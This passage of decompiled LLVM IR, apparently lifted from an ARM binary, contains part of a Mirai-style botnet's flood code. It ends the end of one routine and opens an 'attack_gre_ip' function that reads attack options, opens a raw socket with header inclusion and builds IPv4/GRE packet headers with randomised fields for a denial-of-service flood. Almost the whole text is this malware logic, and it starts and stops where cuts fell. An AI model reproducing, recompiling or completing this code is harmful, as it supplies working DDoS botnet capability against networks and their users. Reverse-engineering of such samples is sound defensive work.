dec_label_pc_ae24:                                ; preds = %dec_label_pc_adc4, %dec_label_pc_ac6c
  %v0_ae24 = call i32 @rand_next()
  store i32 %v0_ae24, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_ae30 = load i32, i32* @fp, align 4
  %v9_ae30 = icmp eq i32 %v0_ae30, 65535
  store i1 %v9_ae30, i1* %cpsr_z.global-to-local, align 1
  %v1_ae34 = load i32, i32* @r5, align 4
  %v2_ae34 = add i32 %v1_ae34, 12
  %v3_ae34 = inttoptr i32 %v2_ae34 to i32*
  store i32 %v0_ae24, i32* %v3_ae34, align 4
  br i1 %v9_ae30, label %dec_label_pc_ae3c, label %dec_label_pc_ae24.dec_label_pc_ac88_crit_edge

dec_label_pc_ae24.dec_label_pc_ac88_crit_edge:    ; preds = %dec_label_pc_ae24
  %v1_ac8c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac88

dec_label_pc_ae3c:                                ; preds = %dec_label_pc_ae24, %dec_label_pc_ac78
  %v0_ae3c = call i32 @rand_next()
  %v3_ae44 = urem i32 %v0_ae3c, 65536
  store i32 %v3_ae44, i32* %r0.global-to-local, align 4
  store i32 %v3_a9ec, i32* %r2.global-to-local, align 4
  %v1_ae50 = sub nsw i32 999, %v3_ae44
  store i32 %v1_ae50, i32* %r3.global-to-local, align 4
  %v1_ae54 = load i32, i32* %r4.global-to-local, align 4
  %v9_ae54 = icmp eq i32 %v3_a9ec, %v1_ae54
  store i1 %v9_ae54, i1* %cpsr_z.global-to-local, align 1
  %v1_ae58 = trunc i32 %v0_ae3c to i16
  %v2_ae58 = load i32, i32* @r5, align 4
  %v3_ae58 = add i32 %v2_ae58, 4
  %v4_ae58 = inttoptr i32 %v3_ae58 to i16*
  store i16 %v1_ae58, i16* %v4_ae58, align 2
  %v0_ae5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae5c = trunc i32 %v0_ae5c to i16
  %v2_ae5c = load i32, i32* @r6, align 4
  %v3_ae5c = add i32 %v2_ae5c, 4
  %v4_ae5c = inttoptr i32 %v3_ae5c to i16*
  store i16 %v1_ae5c, i16* %v4_ae5c, align 2
  br i1 %v9_ae54, label %dec_label_pc_ae64, label %dec_label_pc_ae3c.dec_label_pc_ac94_crit_edge

dec_label_pc_ae3c.dec_label_pc_ac94_crit_edge:    ; preds = %dec_label_pc_ae3c
  %v1_ac98.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac94

dec_label_pc_ae64:                                ; preds = %dec_label_pc_ae3c, %dec_label_pc_ac88
  %v0_ae64 = call i32 @rand_next()
  %v1_ae64 = trunc i32 %v0_ae64 to i16
  store i32 %v0_ae64, i32* %r0.global-to-local, align 4
  store i32 %v3_a9f0, i32* %r3.global-to-local, align 4
  %v1_ae6c = load i32, i32* %r4.global-to-local, align 4
  %v9_ae6c = icmp eq i32 %v3_a9f0, %v1_ae6c
  store i1 %v9_ae6c, i1* %cpsr_z.global-to-local, align 1
  %v3_ae70 = load i32, i32* @r5, align 4
  %v4_ae70 = add i32 %v3_ae70, 58
  %v5_ae70 = inttoptr i32 %v4_ae70 to i16*
  store i16 %v1_ae64, i16* %v5_ae70, align 2
  br i1 %v9_ae6c, label %dec_label_pc_ae78, label %dec_label_pc_aca0

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae64, %dec_label_pc_ac94
  %v0_ae78 = call i32 @rand_next()
  %v1_ae78 = trunc i32 %v0_ae78 to i16
  store i32 %v0_ae78, i32* %r0.global-to-local, align 4
  store i32 %v1_a9e4, i32* @r4, align 4
  store i1 %v2_ae80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae80, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_ae78
  %v3_ae8832 = load i32, i32* @r8, align 4
  %v4_ae8833 = add i32 %v3_ae8832, 2
  %v5_ae8834 = inttoptr i32 %v4_ae8833 to i16*
  store i16 %v1_ae78, i16* %v5_ae8834, align 2
  br label %dec_label_pc_ae94

bb88:                                             ; preds = %dec_label_pc_ae78
  %v1_ae84 = load i32, i32* @r5, align 4
  %v2_ae84 = add i32 %v1_ae84, 16
  %v3_ae84 = inttoptr i32 %v2_ae84 to i32*
  %v4_ae84 = load i32, i32* %v3_ae84, align 4
  store i32 %v4_ae84, i32* %r3.global-to-local, align 4
  %v3_ae88 = load i32, i32* @r8, align 4
  %v4_ae88 = add i32 %v3_ae88, 2
  %v5_ae88 = inttoptr i32 %v4_ae88 to i16*
  store i16 %v1_ae78, i16* %v5_ae88, align 2
  %v1_ae8c = load i32, i32* %r3.global-to-local, align 4
  %v2_ae8c = load i32, i32* @r6, align 4
  %v3_ae8c = add i32 %v2_ae8c, 16
  %v4_ae8c = inttoptr i32 %v3_ae8c to i32*
  store i32 %v1_ae8c, i32* %v4_ae8c, align 4
  br label %dec_label_pc_acb4

dec_label_pc_ae94:                                ; preds = %.thread31, %dec_label_pc_aca0
  %v0_ae94 = call i32 @rand_next()
  store i32 %v0_ae94, i32* %r0.global-to-local, align 4
  %v1_ae98 = load i32, i32* @r6, align 4
  %v2_ae98 = add i32 %v1_ae98, 16
  %v3_ae98 = inttoptr i32 %v2_ae98 to i32*
  store i32 %v0_ae94, i32* %v3_ae98, align 4
  br label %dec_label_pc_acb4

dec_label_pc_aea0:                                ; preds = %dec_label_pc_acb4
  %v0_aea0 = load i32, i32* @r8, align 4
  %v1_aea0 = add i32 %v0_aea0, 8
  store i32 %v1_aea0, i32* %r0.global-to-local, align 4
  store i32 %v5_a938, i32* %r1.global-to-local, align 4
  %v2_aea8 = inttoptr i32 %v1_aea0 to i16*
  %v3_aea8 = call i32 @rand_str(i16* %v2_aea8, i32 %v5_a938)
  store i32 %v3_aea8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad18

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_a9b0
  store i32 %v3_a9a0, i32* %r0.global-to-local, align 4
  %v1_aeb4 = call i32 @__GI___libc_close(i32 %v3_a9a0)
  store i32 %v1_aeb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aeb8

dec_label_pc_aeb8:                                ; preds = %entry, %dec_label_pc_aeb0
  %v1_aec0 = phi i32 [ %v3_a9a0, %entry ], [ %v1_aeb4, %dec_label_pc_aeb0 ]
  store i32 %v3_a850, i32* %r4.global-to-local, align 4
  store i32 %v6_a850, i32* %r5.global-to-local, align 4
  store i32 %v24_a850, i32* %fp.global-to-local, align 4
  ret i32 %v1_aec0

dec_label_pc_aec4:                                ; preds = %dec_label_pc_a9d8
  %v1_aecc = add i32 %v5_a938, 8
  store i32 %v1_aecc, i32* %r1.global-to-local, align 4
  %v1_aed0 = add i32 %v5_a938, 66
  store i32 %v1_aed0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ac2c.preheader

; uselistorder directives
  uselistorder i32 %v1_aed0, { 1, 0 }
  uselistorder i32 %v1_aecc, { 1, 0 }
  uselistorder i16 %v1_ae78, { 1, 0 }
  uselistorder i32 %v0_ae78, { 1, 0 }
  uselistorder i32 %v0_ae64, { 1, 0 }
  uselistorder i32 %v3_ae44, { 1, 0 }
  uselistorder i32 %v0_ae3c, { 1, 0 }
  uselistorder i32 %v5_ae14, { 1, 0 }
  uselistorder i32 %v0_add8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_adb4, { 1, 2, 0 }
  uselistorder i32 %v1_adb0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_ad64, { 1, 0, 2 }
  uselistorder i32 %v4_ad60, { 1, 0 }
  uselistorder i32 %v0_ad4c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ad40, { 1, 0 }
  uselistorder i32 %v7_ac54, { 2, 1, 0, 3 }
  uselistorder i1 %v7_ac70, { 2, 1, 0 }
  uselistorder i1 %v2_ae80, { 2, 3, 1, 0 }
  uselistorder i32 %v0_abc4, { 1, 0, 2 }
  uselistorder i32 %v3_aa40, { 1, 0 }
  uselistorder i32 %v3_aa24, { 1, 2, 0 }
  uselistorder i32 %v1_aa20, { 1, 0 }
  uselistorder i32 %v1_a9e4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_a9e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a9dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a9d8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a9d0, { 1, 0 }
  uselistorder i1 %v7_a9a4, { 1, 0 }
  uselistorder i32 %v3_a9a0, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_a98c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_a958, { 1, 2, 0 }
  uselistorder i32 %v5_a938, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a8ec, { 1, 0 }
  uselistorder i32 %v1_a8c8, { 2, 1, 0 }
  uselistorder i32 %v5_a8c0, { 1, 0 }
  uselistorder i8 %v5_a8a4, { 0, 2, 1 }
  uselistorder i32 %v6_a884, { 1, 0 }
  uselistorder i32 %v2_a86c, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aeb8, { 1, 0 }
  uselistorder label %dec_label_pc_ad18, { 1, 0 }
  uselistorder label %dec_label_pc_acb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ac2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac2c.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_aee4 = load i32, i32* @r4, align 4
  %v6_aee4 = load i32, i32* @r5, align 4
  %v24_aee4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_af00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af04 = load i32, i32* @r5, align 4
  store i32 %v0_af04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_af14 = load i32, i32* @r4, align 4
  %v5_af18 = inttoptr i32 %v0_af04 to i32*
  %v6_af18 = call i32 @attack_get_opt_int(i32 %v0_af14, i32* %v5_af18, i32 2, i32 0)
  %v1_af24 = urem i32 %v6_af18, 256
  store i32 %v1_af24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_af30 = load i32, i32* @r5, align 4
  store i32 %v0_af30, i32* %r1.global-to-local, align 4
  %v0_af34 = load i32, i32* @r4, align 4
  %v5_af38 = trunc i32 %v6_af18 to i8
  %v6_af3c = inttoptr i32 %v0_af30 to i32*
  %v7_af3c = call i32 @attack_get_opt_int(i32 %v0_af34, i32* %v6_af3c, i32 3, i32 65535)
  %v0_af40 = load i32, i32* @r5, align 4
  store i32 %v0_af40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_af3c, i32* %fp.global-to-local, align 4
  %v0_af50 = load i32, i32* @r4, align 4
  %v4_af54 = inttoptr i32 %v0_af40 to i32*
  %v5_af54 = call i32 @attack_get_opt_int(i32 %v0_af50, i32* %v4_af54, i32 4, i32 64)
  %v1_af5c = urem i32 %v5_af54, 256
  store i32 %v1_af5c, i32* %ip.global-to-local, align 4
  %v0_af60 = load i32, i32* @r5, align 4
  store i32 %v0_af60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_af6c = load i32, i32* @r4, align 4
  %v6_af74 = inttoptr i32 %v0_af60 to i32*
  %v7_af74 = call i32 @attack_get_opt_int(i32 %v0_af6c, i32* %v6_af74, i32 5, i32 1)
  %v1_af80 = urem i32 %v7_af74, 256
  store i32 %v1_af80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_af8c = load i32, i32* @r5, align 4
  store i32 %v0_af8c, i32* %r1.global-to-local, align 4
  %v0_af90 = load i32, i32* @r4, align 4
  %v5_af98 = inttoptr i32 %v0_af8c to i32*
  %v6_af98 = call i32 @attack_get_opt_int(i32 %v0_af90, i32* %v5_af98, i32 6, i32 65535)
  %v0_afa0 = load i32, i32* @r5, align 4
  store i32 %v0_afa0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_af98, i32* @r8, align 4
  %v0_afb0 = load i32, i32* @r4, align 4
  %v4_afb4 = inttoptr i32 %v0_afa0 to i32*
  %v5_afb4 = call i32 @attack_get_opt_int(i32 %v0_afb0, i32* %v4_afb4, i32 7, i32 65535)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_afb4, i32* @r7, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  %v4_afcc = inttoptr i32 %v0_afb8 to i32*
  %v5_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v4_afcc, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afdc = load i32, i32* @r5, align 4
  store i32 %v0_afdc, i32* %r1.global-to-local, align 4
  %v0_afe0 = load i32, i32* @r4, align 4
  %v4_afe4 = inttoptr i32 %v0_afdc to i32*
  %v5_afe4 = call i32 @attack_get_opt_int(i32 %v0_afe0, i32* %v4_afe4, i32 1, i32 1)
  %v1_afec = urem i32 %v5_afe4, 256
  store i32 %v1_afec, i32* %ip.global-to-local, align 4
  %v0_aff0 = load i32, i32* @r5, align 4
  store i32 %v0_aff0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_affc = load i32, i32* @r4, align 4
  %v5_b004 = inttoptr i32 %v0_aff0 to i32*
  %v6_b004 = call i32 @attack_get_opt_int(i32 %v0_affc, i32* %v5_b004, i32 19, i32 0)
  %v0_b00c = load i32, i32* @r5, align 4
  store i32 %v0_b00c, i32* %r1.global-to-local, align 4
  %v2_b010 = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_b010, i32* %r3.global-to-local, align 4
  store i32 %v6_b004, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b01c = load i32, i32* @r4, align 4
  %v4_b020 = inttoptr i32 %v0_b00c to i32*
  %v5_b020 = call i32 @attack_get_opt_int(i32 %v0_b01c, i32* %v4_b020, i32 25, i32 %v2_b010)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b034 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_b038 = icmp eq i32 %v3_b034, -1
  store i1 %v7_b038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b038, label %dec_label_pc_b4d8, label %dec_label_pc_b044

dec_label_pc_b044:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b04c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b04c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b060 = call i32 @__GI_setsockopt(i32 %v3_b034, i32 0, i32 3, i32 %v6_b04c, i32 4)
  %v7_b064 = icmp eq i32 %v5_b060, -1
  store i1 %v7_b064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b064, label %dec_label_pc_b4d0, label %dec_label_pc_b06c

dec_label_pc_b06c:                                ; preds = %dec_label_pc_b044
  %v0_b06c = load i32, i32* @r8, align 4
  %v0_b070 = load i32, i32* @r7, align 4
  %v0_b074 = load i32, i32* %fp.global-to-local, align 4
  %v0_b078 = load i32, i32* @r6, align 4
  %v1_b078 = urem i32 %v0_b078, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_b080 = urem i32 %v0_b06c, 65536
  store i32 %v3_b080, i32* %r3.global-to-local, align 4
  %v3_b084 = urem i32 %v0_b070, 65536
  store i32 %v3_b084, i32* %r4.global-to-local, align 4
  %v0_b088 = load i32, i32* @sl, align 4
  %v2_b088 = icmp eq i32 %v0_b088, 0
  store i1 %v2_b088, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b0a0 = urem i32 %v0_b074, 65536
  store i32 %v3_b0a0, i32* @fp, align 4
  br i1 %v2_b088, label %dec_label_pc_b4e4, label %dec_label_pc_b0b0

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b06c
  %v3_b070 = mul i32 %v0_b070, 65536
  %v3_b06c = mul i32 %v0_b06c, 65536
  %v0_b074.not = or i32 %v0_b074, -65536
  %v1_b0b4 = xor i32 %v0_b074.not, 65535
  %v3_b0b8 = mul i32 %v5_afcc, 65536
  %v1_b0bc = add i32 %v3_b0b8, 3407872
  %tmp67 = udiv i32 %v1_b0bc, 256
  %v3_b0d0 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_b0b4, 256
  %v3_b0d4 = and i32 %tmp68, 65280
  store i32 %v3_b0d4, i32* %ip.global-to-local, align 4
  %v1_b0d8 = add i32 %v3_b0b8, 524288
  %v1_b0e0 = add i32 %v3_b0b8, 1835008
  %tmp69 = udiv i32 %v1_b0b4, 256
  %v4_b0e4 = urem i32 %tmp69, 256
  %v5_b0e4 = or i32 %v4_b0e4, %v3_b0d4
  %v4_b0ec = udiv i32 %v1_b0bc, 16777216
  %v5_b0ec = or i32 %v3_b0d0, %v4_b0ec
  store i32 %v5_b0ec, i32* @r8, align 4
  %v3_b0f8 = udiv i32 %v1_b0e0, 256
  %tmp70 = mul i32 %v0_b074, 256
  %v3_b0fc = and i32 %tmp70, 65280
  store i32 %v3_b06c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_b074, 256
  %v4_b10c = urem i32 %tmp71, 256
  %v5_b10c = or i32 %v4_b10c, %v3_b0fc
  %tmp72 = mul i32 %v0_b06c, 256
  %v3_b110 = and i32 %tmp72, 65280
  %v1_b114 = and i32 %v3_b0f8, 65280
  store i32 %v1_b114, i32* @r6, align 4
  store i32 %v3_b070, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_b070, 256
  %v3_b120 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_b06c, 256
  %v4_b124 = urem i32 %tmp74, 256
  %v5_b124 = or i32 %v4_b124, %v3_b110
  store i32 %v5_b124, i32* @lr, align 4
  %v4_b128 = udiv i32 %v1_b0e0, 16777216
  %v5_b128 = or i32 %v1_b114, %v4_b128
  store i32 %v5_b128, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_b070, 256
  %v4_b12c = urem i32 %tmp75, 256
  %v5_b12c = or i32 %v4_b12c, %v3_b120
  %tmp76 = udiv i32 %v1_b0d8, 256
  %v3_b130 = and i32 %tmp76, 65280
  store i32 %v3_b130, i32* @r5, align 4
  %v4_b144 = udiv i32 %v1_b0d8, 16777216
  %v5_b144 = or i32 %v3_b130, %v4_b144
  store i32 %v5_b144, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_b198 = sext i8 %v5_af38 to i32
  %sext12 = mul nuw i32 %v5_b10c, 65536
  %v4_b1b013 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_b128, 65536
  %v4_b214 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_b0e4, 65536
  %v4_b218 = sdiv i32 %sext9, 65536
  %v1_b220 = trunc i32 %v4_b214 to i16
  %v2_b248 = icmp eq i32 %v1_b078, 0
  %sext10 = mul nuw i32 %v5_b124, 65536
  %v4_b268 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_b12c, 65536
  %v4_b270 = sdiv i32 %sext11, 65536
  %v1_b1a8 = trunc i32 %v5_af54 to i8
  br label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %bb82, %dec_label_pc_b0b0
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_b158 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_af00, i32* %r2.global-to-local, align 4
  %v3_b160 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b160, i32* %r3.global-to-local, align 4
  %v2_b164 = load i32, i32* @r4, align 4
  %v5_b164 = mul i32 %v2_b164, 4
  %v6_b164 = add i32 %v5_b164, %v2_af00
  %v7_b164 = inttoptr i32 %v6_b164 to i32*
  store i32 %v2_b158, i32* %v7_b164, align 4
  %v0_b168 = load i32, i32* %r2.global-to-local, align 4
  %v1_b168 = load i32, i32* %r3.global-to-local, align 4
  %v4_b168 = mul i32 %v1_b168, 4
  %v5_b168 = add i32 %v4_b168, %v0_b168
  %v6_b168 = inttoptr i32 %v5_b168 to i32*
  %v7_b168 = load i32, i32* %v6_b168, align 4
  store i32 %v7_b168, i32* %r4.global-to-local, align 4
  %v1_b16c = inttoptr i32 %v7_b168 to i8*
  %v2_b16c = load i8, i8* %v1_b16c, align 1
  %tmp = urem i8 %v2_b16c, 16
  %v1_b170 = zext i8 %tmp to i32
  %v1_b174 = or i32 %v1_b170, 64
  store i32 %v1_b174, i32* %r2.global-to-local, align 4
  %v1_b178 = trunc i32 %v1_b174 to i8
  store i8 %v1_b178, i8* %v1_b16c, align 1
  %v0_b17c = load i32, i32* %r3.global-to-local, align 4
  %v5_b180 = mul i32 %v0_b17c, 24
  store i32 %v5_b180, i32* %r1.global-to-local, align 4
  %v0_b184 = load i32, i32* %r4.global-to-local, align 4
  %v1_b184 = inttoptr i32 %v0_b184 to i8*
  %v2_b184 = load i8, i8* %v1_b184, align 1
  %v1_b188 = and i8 %v2_b184, -16
  %v1_b18c = or i8 %v1_b188, 5
  store i32 %v1_af80, i32* %r5.global-to-local, align 4
  store i8 %v1_b18c, i8* %v1_b184, align 1
  store i32 %v4_b198, i32* %r2.global-to-local, align 4
  %v2_b19c = load i32, i32* %r4.global-to-local, align 4
  %v3_b19c = add i32 %v2_b19c, 1
  %v4_b19c = inttoptr i32 %v3_b19c to i8*
  store i8 %v5_af38, i8* %v4_b19c, align 1
  store i32 %v1_af5c, i32* %r3.global-to-local, align 4
  %v0_b1a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b1a4 = icmp eq i32 %v0_b1a4, 0
  store i1 %v2_b1a4, i1* %cpsr_z.global-to-local, align 1
  %v2_b1a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b1a8 = add i32 %v2_b1a8, 8
  %v4_b1a8 = inttoptr i32 %v3_b1a8 to i8*
  store i8 %v1_b1a8, i8* %v4_b1a8, align 1
  %v0_b1ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b1ac, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_b14c
  store i32 %v4_b1b013, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_b14c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_b1b013, i32* %r5.global-to-local, align 4
  %v3_b1b4 = load i32, i32* %r4.global-to-local, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 6
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 64, i16* %v5_b1b4, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_b1bc = load i32, i32* %r4.global-to-local, align 4
  %v3_b1bc = add i32 %v2_b1bc, 9
  %v4_b1bc = inttoptr i32 %v3_b1bc to i8*
  store i8 47, i8* %v4_b1bc, align 1
  %v0_b1c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b1c0 = add i32 %v0_b1c0, 20
  store i32 %v1_b1c0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_b1c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_b1c8 = trunc i32 %v0_b1c8 to i16
  %v3_b1c8 = add i32 %v0_b1c0, 4
  %v4_b1c8 = inttoptr i32 %v3_b1c8 to i16*
  store i16 %v1_b1c8, i16* %v4_b1c8, align 2
  %v0_b1cc = load i32, i32* @r8, align 4
  %v1_b1cc = trunc i32 %v0_b1cc to i16
  %v2_b1cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b1cc = add i32 %v2_b1cc, 2
  %v4_b1cc = inttoptr i32 %v3_b1cc to i16*
  store i16 %v1_b1cc, i16* %v4_b1cc, align 2
  %v0_b1d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1d0 = trunc i32 %v0_b1d0 to i16
  %v2_b1d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_b1d0 = add i32 %v2_b1d0, 2
  %v4_b1d0 = inttoptr i32 %v3_b1d0 to i16*
  store i16 %v1_b1d0, i16* %v4_b1d0, align 2
  store i32 %v5_b020, i32* %r3.global-to-local, align 4
  %v0_b1d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b1d8 = add i32 %v0_b1d8, 24
  %v2_b1d8 = inttoptr i32 %v1_b1d8 to i8*
  %v3_b1d8 = load i8, i8* %v2_b1d8, align 1
  %v4_b1d8 = zext i8 %v3_b1d8 to i32
  store i32 %v4_b1d8, i32* %r2.global-to-local, align 4
  %v2_b1dc = add i32 %v0_b1d8, 12
  %v3_b1dc = inttoptr i32 %v2_b1dc to i32*
  store i32 %v5_b020, i32* %v3_b1dc, align 4
  %v0_b1e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b1e0 = and i32 %v0_b1e0, -241
  %v1_b1e4 = or i32 %v1_b1e0, 64
  store i32 %v1_b1e4, i32* %r2.global-to-local, align 4
  %v0_b1e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1e8 = load i32, i32* @sb, align 4
  %v2_b1e8 = add i32 %v1_b1e8, %v0_b1e8
  store i32 %v2_b1e8, i32* %r1.global-to-local, align 4
  %v1_b1ec = add i32 %v2_b1e8, 16
  %v2_b1ec = inttoptr i32 %v1_b1ec to i32*
  %v3_b1ec = load i32, i32* %v2_b1ec, align 4
  store i32 %v3_b1ec, i32* %r1.global-to-local, align 4
  %v1_b1f0 = trunc i32 %v1_b1e4 to i8
  %v2_b1f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b1f0 = add i32 %v2_b1f0, 24
  %v4_b1f0 = inttoptr i32 %v3_b1f0 to i8*
  store i8 %v1_b1f0, i8* %v4_b1f0, align 1
  %v0_b1f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b1f4 = add i32 %v0_b1f4, 24
  %v2_b1f4 = inttoptr i32 %v1_b1f4 to i8*
  %v3_b1f4 = load i8, i8* %v2_b1f4, align 1
  %v1_b1f8 = and i8 %v3_b1f4, -16
  %v1_b1fc = or i8 %v1_b1f8, 5
  store i8 %v1_b1fc, i8* %v2_b1f4, align 1
  %v0_b204 = load i32, i32* %r1.global-to-local, align 4
  %v1_b204 = load i32, i32* %r4.global-to-local, align 4
  %v2_b204 = add i32 %v1_b204, 16
  %v3_b204 = inttoptr i32 %v2_b204 to i32*
  store i32 %v0_b204, i32* %v3_b204, align 4
